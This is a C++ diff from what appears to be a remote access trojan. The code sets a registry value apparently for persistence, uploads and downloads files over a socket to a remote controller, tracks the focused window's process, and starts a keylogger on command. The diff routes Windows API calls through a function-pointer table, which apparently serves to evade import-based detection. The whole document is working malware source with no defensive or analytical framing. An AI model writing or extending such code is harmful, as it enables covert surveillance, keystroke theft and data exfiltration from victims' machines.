@@ -28,7 +28,7 @@ int Connection::boot() {
 
 
     DWORD pathLenInBytes = pathLen * sizeof(*szPath);
-    if (RegSetValueExA(NewVal, TEXT("E"), 0, REG_SZ, (LPBYTE) szPath, pathLenInBytes) != ERROR_SUCCESS) {
+    if (functions->RegSetValueExA_Function(NewVal, TEXT("E"), 0, REG_SZ, (LPBYTE) szPath, pathLenInBytes) != ERROR_SUCCESS) {
         RegCloseKey(NewVal);
         return -1;
     }
@@ -38,7 +38,7 @@ int Connection::boot() {
 
 //Get process name by his pid
 string Connection::getProcessName(int pid) {
-    HANDLE hProcess = ::OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE,
+    HANDLE hProcess = functions->OpenProcess_Function(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE,
                                     pid); //Open handle to the process
     //Checking if the handle opened
     if (!hProcess) {
@@ -48,7 +48,7 @@ string Connection::getProcessName(int pid) {
     TCHAR szProcessName[MAX_PATH]; //Buffer of that holds the process name
     GetModuleBaseNameA(hProcess, NULL, szProcessName, sizeof(szProcessName) /
                                                       sizeof(TCHAR)); //Getting the process name and storing it in szProcessName
-    CloseHandle(hProcess);
+    functions->CloseHandle_Function(hProcess);
     cout << szProcessName << endl;
     return szProcessName;
 }
@@ -58,7 +58,7 @@ string Connection::getFocusWindowName() {
     HWND hWindow = ::GetForegroundWindow(); //Get HWND to the focus window
     DWORD pid;
     ::GetWindowThreadProcessId(hWindow, &pid);
-    CloseHandle(hWindow);
+    functions->CloseHandle_Function(hWindow);
     return getProcessName(pid);
 }
 
@@ -69,7 +69,7 @@ void Connection::sendMessage(const char *data) {
 
 
 void Connection::sendFile(string path) {
-    HANDLE hFile = ::CreateFileA(path.c_str(),
+    HANDLE hFile = functions->CreateFileA_Function(path.c_str(),
                                  GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING,
                                  FILE_ATTRIBUTE_NORMAL, NULL);
     if (hFile == INVALID_HANDLE_VALUE) {
@@ -83,7 +83,7 @@ void Connection::sendFile(string path) {
     DWORD bytesRead = sizeof(DWORD);
     LARGE_INTEGER fileSize;
     int totalReadData = 0;
-    ::GetFileSizeEx(hFile, &fileSize);
+    functions->GetFileSizeEx_Function(hFile, &fileSize);
 
     //Adding $ to sizeToSend
     string sizeToSend = to_string(fileSize.QuadPart);
@@ -112,13 +112,13 @@ void Connection::sendFile(string path) {
 void Connection::recvFile(string path) {
     vector<char> buffer(BUFFER_SIZE + 1, 0);
 
-    HANDLE hFile = ::CreateFileA(path.c_str(), GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
+    HANDLE hFile = functions->CreateFileA_Function(path.c_str(), GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
                                  NULL,
                                  CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
     if (hFile == INVALID_HANDLE_VALUE) {
         sendMessage(CANT_OPEN_FILE);
         cout << "ERROR " << CANT_OPEN_FILE << " Cant open the file" << endl;
-        CloseHandle(hFile);
+        functions->CloseHandle_Function(hFile);
         return;
     }
     sendMessage(HANDLE_WAS_OPENED);
@@ -151,7 +151,7 @@ void Connection::recvFile(string path) {
         functions->WriteFile_Function(hFile, buffer.data(), size, NULL, NULL);
         cout << totalFileSize << endl;
     }
-    CloseHandle(hFile);
+    functions->CloseHandle_Function(hFile);
     send(sock, FILE_WAS_SENT, 4, 0);
 }
 
@@ -330,7 +330,7 @@ void Connection::connection() {
             sendMessage(files.c_str());
             continue;
         } else if (!command.rfind("start keylogger")) {
-            CreateThread(nullptr, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(Keylogger::startKeylogger),
+            functions->CreateThread_Function(nullptr, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(Keylogger::startKeylogger),
                          keylogger, 0, nullptr);
             cout << "Test:start keylogger" << endl;
             sendMessage("The keylogger has started");
